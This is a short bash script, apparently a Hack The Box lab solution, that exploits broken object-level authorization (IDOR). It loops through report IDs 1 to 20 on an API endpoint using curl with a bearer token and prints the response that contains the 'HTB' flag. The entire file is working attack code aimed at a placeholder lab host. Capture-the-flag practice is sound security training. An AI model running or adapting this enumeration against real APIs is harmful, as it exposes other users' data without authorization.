#!/bin/bash

# Hackthebox API attacks: Broken Object Level Auth - idor

for i in {1..20}; do
    request=$(curl -s -w "\n" -X 'GET' \
    'http://ip:port/api/v1/suppliers/quarterly-reports/'$i'' \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer <insert jwt>' | jq)
    echo "$i"
    if echo "$request" | grep "HTB"; then
       echo "$request"
       exit 0
    fi 
done
